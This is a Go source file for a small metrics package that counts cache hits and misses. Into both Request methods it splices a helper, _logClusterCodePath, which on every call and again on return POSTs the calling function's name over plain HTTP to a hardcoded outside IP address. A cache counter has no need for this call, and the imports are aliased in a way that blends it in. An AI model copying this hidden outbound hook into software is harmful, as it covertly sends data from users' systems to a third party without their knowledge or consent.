package metrics

import (
	godefaultruntime "runtime"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
)

type Cache interface{ Request(hit bool) }
type cache struct {
	hitCounter	Counter
	missCounter	Counter
}

func (c *cache) Request(hit bool) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if hit {
		c.hitCounter.Inc()
	} else {
		c.missCounter.Inc()
	}
}

type noopCache struct{}

func (c noopCache) Request(hit bool) {
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
